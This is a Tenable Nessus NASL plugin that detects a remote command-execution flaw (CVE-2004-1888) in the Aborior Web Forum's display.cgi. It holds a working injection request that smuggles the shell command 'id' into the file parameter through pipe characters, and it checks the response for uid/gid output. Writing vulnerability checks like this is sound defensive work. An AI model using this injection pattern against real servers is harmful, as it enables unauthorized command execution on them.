#
# (C) Tenable Network Security
#

 desc = "
The remote host seems to be running the Aborior Web Forum.

There is a flaw in this version which may allow an attacker to
execute arbitrary commands on this server, with the privileges
of the web server.

Solution : None at this time - disable this CGI
Risk factor : High";


if(description)
{
 script_id(12127);
 script_cve_id("CVE-2004-1888");
 script_bugtraq_id(10040);
 script_version ("$Revision: 1.5 $");
 
 name["english"] = "Aborior Command Execution";
 script_name(english:name["english"]);
 
 script_description(english:desc);
 
 summary["english"] = "Detects display.cgi";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

http_check_remote_code (
			check_request:"/display.cgi?preftemp=temp&page=anonymous&file=|id|",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id",
			description:desc
			);
